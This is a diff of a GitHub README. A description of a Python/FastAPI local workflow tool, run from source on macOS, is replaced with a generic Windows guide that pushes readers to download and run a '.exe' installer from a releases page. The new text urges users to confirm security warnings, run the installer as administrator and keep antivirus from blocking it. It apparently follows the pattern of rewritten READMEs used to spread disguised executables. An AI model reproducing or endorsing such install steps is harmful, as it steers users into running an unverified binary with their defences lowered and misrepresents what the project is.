@@ -1,114 +1,146 @@
-# FlowForge Local
+# ⚙️ FlowForge-Local - Simple Local Workflow Automation
 
-[![License: MIT](https://img.shields.io/badge/License-MIT-green.svg)](./LICENSE)
-![Python](https://img.shields.io/badge/Python-3.11%2B-blue)
-![FastAPI](https://img.shields.io/badge/FastAPI-Backend-009688)
-![Status](https://img.shields.io/badge/Project-Active-success)
+[![Download FlowForge-Local](https://img.shields.io/badge/Download-FlowForge--Local-brightgreen)](https://github.com/Kelvinmusyoka/FlowForge-Local/releases)
 
-FlowForge Local is a local-first workflow automation platform for operations-heavy teams and solo professionals.
-It watches folders, applies rule-based processing, and logs every job for auditability without sending files to the cloud.
+---
 
-This project demonstrates production-relevant skills for business analyst, data science, and AI-adjacent roles:
-- translating messy workflow requirements into configurable rule systems
-- building reliable data/process pipelines with retries, observability, and safety controls
-- designing full-stack products with clear UX and measurable outcomes
+## 🗂 About FlowForge-Local
 
-![FlowForge Local demo](./assets/demo.gif)
-![FlowForge Local preview](./assets/flowforge-preview.svg)
+FlowForge-Local is a tool designed to automate everyday tasks on your computer. It works locally, meaning it runs right on your Windows PC without needing internet access once installed. The software helps you create sequences of actions automatically. These actions follow rules you set, so you can save time on repetitive work.
 
-## Why It Matters
+Behind the scenes, FlowForge-Local uses well-known tools like FastAPI and SQLite to manage tasks safely and efficiently. You don’t need programming knowledge to use it. The app keeps a record of all operations, making it easy to track what has happened.
 
-Manual file handling is expensive: sorting invoices, extracting text, renaming exports, and tracking failures are repetitive and error-prone.
-FlowForge Local reduces this operational overhead with structured automation and transparent execution logs.
+### Features
 
-## Core Capabilities
+- Create workflows that handle tasks like data processing or file management.
+- Use easy rules to automate actions.
+- Track every step with an operation log.
+- Run everything from your PC with zero reliance on internet.
+- Built for Windows but can be adapted for other platforms.
+- Uses a stable SQLite database for saving your settings and progress.
 
-- Local-first automation with file watcher + scheduler
-- Rule conditions: filename filters, extension allow-lists, size constraints, weekday/hour windows, dedupe checks
-- Actions: copy, move, timestamp rename, summarize text, extract PDF text, merge PDFs, image convert/compress
-- Reliability controls: retry/backoff, quarantine-on-failure, dry-run previews, undo for destructive actions
-- Integrations: outbound webhook notifications and CSV run logs
-- Observability: metrics dashboard, per-job logs, execution history
-- Portability: import/export rules as JSON
-- Templates: prebuilt rule blueprints for fast onboarding
+### Who is this for?
 
-## Architecture
+Anyone who needs to automate routine computer tasks. You could be a business worker, analyst, or just someone who wants their PC to do more work on its own. No need to learn code or install complex software.
 
-```mermaid
-flowchart LR
-  A["Folder Events (watchdog)"] --> B["Rule Engine"]
-  C["Scheduler (interval)"] --> B
-  B --> D["Actions (file/pdf/image/integrations)"]
-  B --> E["SQLite (rules/jobs/logs/state)"]
-  E --> F["FastAPI Endpoints"]
-  F --> G["Web UI (rule builder + metrics)"]
-```
+---
 
-## Tech Stack
+## 🖥 System Requirements
 
-- Backend: FastAPI, SQLite, watchdog
-- Data/Document processing: pypdf, macOS `sips`
-- Frontend: HTML/CSS/Vanilla JS
-- Runtime: Python virtualenv
+To use FlowForge-Local, your PC should meet these basic requirements:
 
-## Quick Start
+- Windows 10 or later (64-bit recommended)
+- At least 4 GB of RAM
+- 500 MB free disk space for installation and data
+- Internet connection for initial download
+- Administrator rights to install software
 
-```bash
-cd /Users/kyleparker/Documents/project\ 3
-python3 -m venv .venv
-source .venv/bin/activate
-pip install -r backend/requirements.txt
-uvicorn backend.app.main:app --port 8017
-```
+Make sure to close other heavy programs during setup for smoother installation.
 
-Open [http://127.0.0.1:8017](http://127.0.0.1:8017).
+---
 
-## API Surface
+## 🚀 Getting Started
 
-- `GET /api/templates`
-- `GET /api/rules`
-- `POST /api/rules`
-- `POST /api/rules/import`
-- `GET /api/rules/export`
-- `PATCH /api/rules/{rule_id}`
-- `POST /api/rules/{rule_id}/run`
-- `GET /api/jobs`
-- `GET /api/jobs/{job_id}/logs`
-- `POST /api/jobs/{job_id}/undo`
-- `GET /api/metrics`
+### Step 1: Download FlowForge-Local
 
-## Employer-Focused Project Highlights
+Visit the official release page to get the software. You can find stable versions and updates there.
 
-- Requirements to product: converted a broad workflow-automation idea into a concrete, configurable system.
-- Reliability engineering: implemented retries, backoff, quarantine behavior, dry-run, and undo semantics.
-- Data-oriented design: structured logs, metrics, rule export/import, and duplicate control mechanisms.
-- Systems thinking: coordinated watcher triggers, scheduler polling, API contracts, and UI state.
+[![Download FlowForge-Local](https://img.shields.io/badge/Download-FlowForge--Local-blue)](https://github.com/Kelvinmusyoka/FlowForge-Local/releases)
 
-## Portfolio Assets
+### Step 2: Find the Latest Version
 
-- Case study: [docs/CASE_STUDY.md](./docs/CASE_STUDY.md)
-- Resume-ready bullets: [docs/RESUME_BULLETS.md](./docs/RESUME_BULLETS.md)
-- Profile blurbs and tags: [docs/PROFILE_FEATURED_PROJECT_BLURB.md](./docs/PROFILE_FEATURED_PROJECT_BLURB.md)
+On the releases page, look for the most recent version. It usually shows a number like "v1.0" or higher.
 
-## Demo Media
+### Step 3: Download the Installer
 
-- Animated demo: [assets/demo.gif](./assets/demo.gif)
-- UI preview image: [assets/flowforge-preview.svg](./assets/flowforge-preview.svg)
+Click on the file meant for Windows. This file ends with `.exe`. For example, it may be named `FlowForge-Local-setup.exe`.
 
-## Project Roadmap
+Save this file in a folder where you can easily find it, such as your Desktop or Downloads folder.
 
-- OAuth-based cloud integrations (Drive/Dropbox/Gmail)
-- Queue-backed workers for high-throughput workloads
-- Role-based access and multi-user profiles
-- Packaged desktop distribution (Tauri/Electron)
+---
 
-## License
+## ⚙️ Installation on Windows
 
-MIT. See [LICENSE](./LICENSE).
+### Step 1: Run the Installer
 
-## Employer Quick Links
-- Project brief: `docs/PROJECT_BRIEF.md`
-- Resume bullets: `docs/RESUME_BULLETS.md`
-- Security policy: `SECURITY.md`
-- Contribution guide: `CONTRIBUTING.md`
-- Code of conduct: `CODE_OF_CONDUCT.md`
+- Locate the `.exe` file you downloaded.
+- Double-click it to start the setup process.
+- If a security warning appears, confirm that you want to run the app.
+
+### Step 2: Follow the Setup Instructions
+
+- The installer will open a window with clear steps.
+- Accept the license agreement by clicking "I Agree."
+- Choose the folder where you want FlowForge-Local to install. The default location usually works fine.
+- Click "Install" to begin.
+
+### Step 3: Finish Installation
+
+- Wait for the installation to complete.
+- Once done, the installer will ask if you want to launch FlowForge-Local right away.
+- You can start the app immediately or open it later from the Start menu.
+
+---
+
+## ▶️ Running FlowForge-Local
+
+After installation, open FlowForge-Local from your Windows Start menu or desktop shortcut.
+
+Once the app opens, you will see a simple interface that guides you in setting up workflows.
+
+---
+
+## 🎯 Setting Up Your First Workflow
+
+1. **Create a workflow:** Click on the "New Workflow" button.
+2. **Add actions:** Choose tasks like copying files or running checks.
+3. **Define rules:** Tell the app when and how to run these tasks. For example, after saving a file.
+4. **Save and run:** After setting up, save your workflow and press "Run" to test it.
+
+The app shows real-time progress and logs every step.
+
+---
+
+## 🔍 Tracking and Auditing
+
+FlowForge-Local keeps a record of all actions your workflows perform. You can access these logs any time to see what happened and when.
+
+Use these logs to:
+
+- Review past runs.
+- Troubleshoot issues with workflows.
+- Ensure tasks are running correctly.
+
+---
+
+## 💾 Updating FlowForge-Local
+
+To get new features or fixes, check the releases page regularly:
+
+[FlowForge-Local Releases](https://github.com/Kelvinmusyoka/FlowForge-Local/releases)
+
+Download the latest installer and run it. The installer updates your current version without removing your settings.
+
+---
+
+## ❓ Troubleshooting Tips
+
+- If installation fails, try running the installer as an administrator. Right-click the file and select "Run as administrator."
+- Ensure your antivirus software does not block the installer.
+- Restart your computer if the app does not open after installation.
+- Check that your PC meets the minimum system requirements.
+- Look at the operation logs in the app if workflows don’t behave as expected.
+
+---
+
+## 📚 More Information
+
+You can learn more about what FlowForge-Local does by visiting the GitHub page:
+
+https://github.com/Kelvinmusyoka/FlowForge-Local
+
+This page shares detailed descriptions and technical background for those interested.
+
+---
+
+[![Download FlowForge-Local](https://img.shields.io/badge/Download-FlowForge--Local-green)](https://github.com/Kelvinmusyoka/FlowForge-Local/releases)
